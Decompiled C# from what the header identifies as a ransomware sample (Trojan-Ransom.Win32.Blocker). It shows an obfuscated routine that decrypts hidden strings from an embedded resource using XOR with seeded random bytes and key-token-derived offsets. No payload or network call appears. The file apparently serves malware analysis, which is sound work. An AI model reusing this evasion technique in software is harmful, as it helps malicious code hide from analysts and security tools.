// Decompiled with JetBrains decompiler
// Type: ?1?.?11?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCE56BF6-1478-4F80-8758-2108CD9D4C80
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jtre-eb5e0b099fc84d1d2c2bf7760be02cd5b14c59a9a1650c18de62d6fa9084bb85.exe

using \u003F1\u003F;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace \u003F1\u003F
{
  internal static class \u003F11\u003F
  {
    private static readonly object \u003F1\u003F = new object();
    private static Dictionary<int, string> \u003F1\u003F;

    internal static string \u003F1\u003F(int _param0, int _param1, int _param2)
    {
      lock (\u003F11\u003F.\u003F1\u003F)
      {
        int num1 = _param0 ^ 1909261301;
        if (\u003F11\u003F.\u003F1\u003F != null && \u003F11\u003F.\u003F1\u003F.ContainsKey(num1))
          return \u003F11\u003F.\u003F1\u003F[num1];
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        byte[] buffer1;
        using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(\u003F82\u003F.\u003F83\u003F("\u0017įɸ̪Хոٻݸ\u087Aधੰ୰ఠപร༥ဩᄿሾጻᑭᔽᙩ\u173AᡬᥥᨴᬵᰰᴵṤἱ")))
        {
          buffer1 = new byte[manifestResourceStream.Length];
          manifestResourceStream.Read(buffer1, 0, Convert.ToInt32(manifestResourceStream.Length));
        }
        int num2 = _param1;
        byte[] publicKeyToken = executingAssembly.GetName().GetPublicKeyToken();
        int num3;
        if (publicKeyToken != null && publicKeyToken.Length == 8)
        {
          int int32_1 = BitConverter.ToInt32(publicKeyToken, 0);
          int int32_2 = BitConverter.ToInt32(publicKeyToken, 4);
          num3 = num2 ^ int32_1 ^ int32_2;
        }
        else
          num3 = num2 ^ 789710991;
        int length = _param2 ^ 1312007453;
        byte[] bytes = new byte[length];
        int num4 = 0;
        for (int index = num3; index < num3 + length; ++index)
          bytes[num4++] = buffer1[index];
        byte[] buffer2 = new byte[length];
        new Random(num1).NextBytes(buffer2);
        for (int index = 0; index < length; ++index)
          bytes[index] ^= buffer2[index];
        string str = Encoding.Unicode.GetString(bytes);
        if (\u003F11\u003F.\u003F1\u003F == null)
          \u003F11\u003F.\u003F1\u003F = new Dictionary<int, string>();
        \u003F11\u003F.\u003F1\u003F.Add(num1, str);
        return str;
      }
    }
  }
}
